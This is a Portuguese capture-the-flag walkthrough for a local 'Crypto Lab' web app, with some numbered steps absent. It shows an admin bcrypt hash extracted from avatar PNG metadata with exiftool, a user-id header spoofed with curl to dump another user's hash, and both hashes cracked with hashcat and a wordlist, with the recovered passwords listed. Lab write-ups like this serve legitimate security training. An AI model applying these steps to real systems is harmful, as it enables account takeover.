================================================================================
VISAO GERAL
================================================================================

O desafio consiste em explorar vulnerabilidades de uma aplicacao web para
descobrir senhas, obter privilegios de administrador e acessar a pagina
secreta com a flag.

Ferramentas necessarias:
- Navegador web
- ExifTool (analise de metadados)
- Hashcat (quebra de hashes bcrypt)
- cURL (requisicoes HTTP)


================================================================================
PASSO 1 — EXPLORACAO INICIAL
================================================================================

Acesse http://localhost:3000 e voce vera a tela de login do Crypto Lab.

Dica: Antes de tentar logar, explore o que o site revela sobre si mesmo.

================================================================================
PASSO 3 — ANALISAR O AVATAR DO ADMIN
================================================================================

O comentario no backup diz que o admin "costumava guardar a senha na sua
figurinha". O avatar do admin e servido em /avatar/newbie.png.

3.1 Baixar o avatar
--------------------

    curl -o newbie.png http://localhost:3000/avatar/newbie.png

3.2 Analisar metadados com ExifTool
------------------------------------

    exiftool -a -u -g1 newbie.png

Resultado obtido (validado):

    AdminHash:$2b$04$rjHzGeJRg4cEzMXPqoqO/.aTCfput36FfmVzVGai9Yun2bBmW3RX2

Pista encontrada: O hash bcrypt do admin esta embutido nos metadados do PNG.


================================================================================
PASSO 4 — QUEBRAR A SENHA DO ADMIN
================================================================================

O hash encontrado no avatar e:

    $2b$04$rjHzGeJRg4cEzMXPqoqO/.aTCfput36FfmVzVGai9Yun2bBmW3RX2

Este hash tem custo 4 (bcrypt), o que o torna relativamente facil de quebrar.

Usando uma wordlist basica, a senha encontrada foi:

    admin123

Validacao (testado com bcrypt.compare):

    Hash do PNG:  $2b$04$rjHzGeJRg4cEzMXPqoqO/.aTCfput36FfmVzVGai9Yun2bBmW3RX2
    Senha:        admin123
    Resultado:     SENHA ENCONTRADA: admin123

================================================================================
PASSO 9 — QUEBRAR A SENHA DO DALMAZO
================================================================================

9.1 Extrair o hash do dalmazo
------------------------------

Acesse o Dashboard e copie o hash do dalmazo na tabela de usuarios.
Ou use o endpoint da API:

    curl -H "x-user-id: 1" http://localhost:3000/usersx

O hash do dalmazo obtido (validado):

    $2b$08$NS6Iw8Cg50cdAl549hw5t.BqbL0dS37r9agNsX2psBBnKyUxjvMd2

9.2 Usar Hashcat para quebrar
------------------------------

    # Crie um arquivo com o hash do dalmazo
    echo '$2b$08$NS6Iw8Cg50cdAl549hw5t.BqbL0dS37r9agNsX2psBBnKyUxjvMd2' > hash.txt

    # Quebre com hashcat (modo 3200 = bcrypt)
    hashcat -m 3200 -w 3 hash.txt /usr/share/wordlists/rockyou.txt

Resultado obtido (validado):

    Senha do dalmazo: bubblestar
